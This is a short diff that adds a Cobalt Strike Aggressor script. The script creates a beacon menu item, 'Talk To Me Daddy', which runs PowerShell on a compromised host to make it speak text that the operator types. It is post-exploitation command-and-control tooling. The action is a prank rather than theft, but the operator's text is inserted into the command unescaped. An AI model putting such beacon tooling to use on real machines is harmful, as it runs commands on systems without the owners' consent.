@@ -1,0 +1,15 @@
+popup beacon
+{
+	separator();
+	item "Talk To Me Daddy"
+	{
+		$beaconID = $1;
+		prompt_text("Enter TTS","Want to play a game",
+		{
+			$command = "Add-Type –AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(' " . $1 . "');";
+			bpowershell($beaconID, $command);
+		});
+	}
+}
+
+#PowerShell -Command "Add-Type –AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('hello');"
